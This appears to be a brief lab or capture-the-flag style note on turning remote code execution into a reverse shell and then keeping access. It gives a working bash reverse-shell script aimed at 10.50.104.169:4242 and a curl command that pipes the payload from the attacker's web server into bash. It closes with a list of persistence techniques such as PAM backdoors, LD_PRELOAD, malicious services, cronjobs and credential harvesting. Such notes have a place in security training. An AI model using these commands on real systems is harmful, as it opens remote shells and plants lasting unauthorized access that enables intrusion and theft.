
One thing to keep in mind that: How to get a reverse shell on a box once you have RCE:
- netcat 
- bash 
- python 
- perl


To start up a local web server on your attacking machine:
- http.server
- updog
- php

Reverse Shell
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.50.104.169/4242 0>&1
```

Now will use the RCE vulnerability and try to load the payload and trigger it using the bash command which will run the payload and we should get the reverse shell 
```
curl http://10.50.104.169:8080/rev_shell.sh|bash &
```

So what to do after we gained a decent foothold and have a stable shell. Like we don't want to lose our foothold and redo the work if the machine is reset or our shell get's terminated.

SO different methods for persistence: LD_PRELOAD Backdoored binaries PAM backdoor SSH keys Malicious Services Cronjob Credential harvesting


